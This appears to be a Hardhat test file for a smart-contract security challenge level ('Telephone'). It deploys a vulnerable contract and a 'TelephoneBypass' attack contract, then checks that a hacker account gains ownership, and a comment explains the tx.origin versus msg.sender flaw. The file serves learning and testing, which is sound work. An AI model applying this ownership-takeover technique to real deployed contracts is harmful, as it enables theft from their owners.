import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 04 - Telephone contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();
        const TelephoneContract = await ethers.getContractFactory("Telephone");
        const TelephoneHackerContract = await ethers.getContractFactory("TelephoneBypass");

        const telephone = await TelephoneContract.deploy();
        const telephoneBypass = await TelephoneHackerContract.deploy(await telephone.getAddress());

        return {owner, hacker, telephone, telephoneBypass};
    };

    describe("When deploying", () => {
        it("Owner should be the telephone contract deployer", async() => {
            const {owner, hacker, telephone, telephoneBypass} = await loadFixture(setUp);
            expect(await telephone.owner()).to.equal(owner.address);
        });
    });

    describe("When hacking", () => {
        it("Owner should be the hacker account after calling changeOwner through the bypass contract", async() => {
            /*
             * When calling the changeOwner() method from the Telephone contract, the only requirement is that tx.origin should not match msg.sender.
             * msg.sender is the current call's sender; tx.origin points to the tx's origin address.
             * msg.sender and tx.origin can differ if there's at least an intermediary contract between the EOA that triggers the operation
             * and the ultimate callee.
             * 
             * By using TelephoneBypass as the intermediary contract: 
             * tx.origin == hacker wallet address
             * msg.sender == bypass contract address
            **/
            const {owner, hacker, telephone, telephoneBypass} = await loadFixture(setUp);
            
            expect(await telephone.owner()).to.equal(owner.address);
            
            await telephoneBypass.connect(hacker).changeTelephoneContractOwner();
            expect(await telephone.owner()).to.equal(hacker.address);
        });
    });
});